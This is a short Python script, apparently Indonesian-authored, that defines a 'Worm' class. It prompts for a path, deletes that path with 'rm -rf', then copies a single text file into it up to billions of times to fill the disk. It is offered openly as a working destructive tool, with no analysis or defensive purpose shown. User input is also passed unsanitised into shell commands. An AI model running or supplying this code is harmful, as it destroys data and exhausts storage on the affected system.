import os, sys
from time import sleep

class Worm:
	def __init__(self):
		self.system = os.system
		self.popen = os.popen
		self.mkdir = os.mkdir

	def Duplicate(self, path, namefile, text):
		self.system('rm -rf {}'.format(path))
		self.mkdir(path)
		f = open(namefile+'.txt','w')
		f.write(text)
		f.close()
		self.system('mv {} {}'.format(namefile+'.txt', path))

		for sdcard, dir, files in os.walk('{}'.format(path)):
			for filename in files:
				filesname = os.path.join(path, filename)
				i=0
				try:
					while True:
						if i < 99999999999:
							i+=1
							self.popen('cp {} {} &> /dev/null'.format(filesname, filesname+str(i)))
				except KeyboardInterrupt:
					sys.exit('Goodbyee')





if __name__=="__main__":
	from threading import Thread as td
	path = input('Path: ')
	namefile = input('Nama file : ')
	text = input('Text : ')
	app = Worm()
	def oke():
		app.Duplicate(path, namefile, text)
	try:
		t = td(target=oke)
		t.start()
		while t.is_alive:
			for i in '-\|/-\|/':
				print('\rSedang menduplikat '+i+' ',end="",flush=True)
				sleep(0.1)
	except KeyboardInterrupt:
		sys.exit('\nDone')
